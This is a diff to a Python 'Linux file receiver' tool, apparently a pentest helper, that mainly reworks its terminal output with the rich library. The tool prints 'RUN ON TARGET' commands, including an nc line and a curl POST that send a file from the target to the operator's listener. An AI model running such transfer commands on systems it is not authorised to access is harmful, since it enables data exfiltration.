@@ -5,6 +5,13 @@ import subprocess
 
 from pathlib import Path
 
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich import box
+
+console = Console()
+
 
 # =========================================================
 # COLORS
@@ -81,13 +88,28 @@ def require_outfile(args):
 
     if not outfile:
 
-        print(
-            f"\n{R}[!] Missing output filename{W}"
-        )
+        console.print("[red][!] Missing output filename[/red]")
 
         return None
 
     return Path(outfile)
+
+
+def _print_script(lines, title):
+
+    #
+    # No box — a bordered panel puts a leading "│" on every line, which a
+    # drag-select-to-copy off the terminal (no clipboard access, over SSH,
+    # etc.) would grab too. A rule frames it without touching the text.
+    #
+    console.print()
+    console.rule(f"[bold yellow]▸ {title}[/bold yellow]", style="yellow", align="left")
+    console.print()
+
+    for line in lines:
+        console.print(f"[bold yellow]{line}[/bold yellow]", soft_wrap=True, highlight=False)
+
+    console.print()
 
 
 # =========================================================
@@ -104,22 +126,13 @@ def mode_nc(
         f"nc {ip} {port} < {outfile.name}"
     )
 
-    print(
-        f"\n{M}=== NC ==={W}\n"
-    )
-
-    print(helper)
+    _print_script([helper], "RUN ON TARGET")
 
     copy_clipboard(helper)
 
-    print(
-        f"\n{G}→ helper copied to clipboard{W}"
-    )
-
-    print(
-        f"\n{Y}[*] Listening on {port}"
-        f" -> {outfile}{W}"
-    )
+    console.print("[green]→ copied to clipboard[/green]")
+    console.print()
+    console.print(f"[yellow][*] Listening on {port} -> {outfile}[/yellow]", highlight=False)
 
     subprocess.run(
         f"nc -lvnp {port} > '{outfile}'",
@@ -143,22 +156,13 @@ def mode_http(
         f"http://{ip}:{port}"
     )
 
-    print(
-        f"\n{M}=== HTTP ==={W}\n"
-    )
-
-    print(helper)
+    _print_script([helper], "RUN ON TARGET")
 
     copy_clipboard(helper)
 
-    print(
-        f"\n{G}→ helper copied to clipboard{W}"
-    )
-
-    print(
-        f"\n{Y}[*] Listening on {port}"
-        f" -> {outfile}{W}"
-    )
+    console.print("[green]→ copied to clipboard[/green]")
+    console.print()
+    console.print(f"[yellow][*] Listening on {port} -> {outfile}[/yellow]", highlight=False)
 
     subprocess.run(
         f"nc -lvnp {port} > '{outfile}'",
@@ -177,22 +181,14 @@ def mode_offline(outfile):
         f" | tr -d '\\n'; echo;"
     )
 
-    print(
-        f"\n{M}=== OFFLINE ==={W}\n"
-    )
-
-    print(helper)
+    _print_script([helper], "RUN ON TARGET")
 
     copy_clipboard(helper)
 
-    print(
-        f"\n{G}→ helper copied to clipboard{W}"
-    )
-
-    print(
-        f"\nPaste base64 now "
-        f"(Ctrl-D when done)\n"
-    )
+    console.print("[green]→ copied to clipboard[/green]")
+    console.print()
+    console.print("[bold blue][*][/bold blue] Paste the base64 output below (Ctrl-D when done):")
+    console.print()
 
     data = input()
 
@@ -200,9 +196,7 @@ def mode_offline(outfile):
 
     outfile.write_bytes(decoded)
 
-    print(
-        f"\n{G}[+] Saved -> {outfile}{W}"
-    )
+    console.print(f"[green][+] Saved -> {outfile}[/green]", highlight=False)
 
 
 # =========================================================
@@ -211,33 +205,32 @@ def mode_offline(outfile):
 
 def choose_mode():
 
-    print(
-        f"\n{W_BOLD}"
-        f"[*] LINUX FILE RECEIVER"
-        f"{W}"
+    table = Table(box=None, show_header=False, pad_edge=False, padding=(0, 2, 0, 0))
+    table.add_column(style="bold cyan", no_wrap=True)
+    table.add_column(style="white")
+    table.add_column(style="dim")
+
+    table.add_row("[1] HTTP", "curl POST", "one-shot receiver, decodes on arrival")
+    table.add_row("[2] NC", "raw netcat", "simplest, needs an open listener port")
+    table.add_row("[3] Offline", "base64 paste", "no network in/out at all")
+
+    console.print()
+    console.print(
+        Panel(
+            table,
+            title="[bold white]LINUX FILE RECEIVER[/bold white]",
+            title_align="left",
+            border_style="blue",
+            box=box.ROUNDED,
+            padding=(1, 2),
+        )
     )
 
-    print(
-        f"\n  {B}[1]{W} NC"
-    )
-
-    print(
-        f"  {B}[2]{W} HTTP"
-    )
-
-    print(
-        f"  {B}[3]{W} Offline Base64"
-    )
-
-    print()
-
-    choice = input(
-        f"{B}select{W}> "
-    ).strip()
+    choice = input(f"\n{B}select> {W}").strip()
 
     return {
-        "1": "nc",
-        "2": "http",
+        "1": "http",
+        "2": "nc",
         "3": "offline",
     }.get(choice)
 
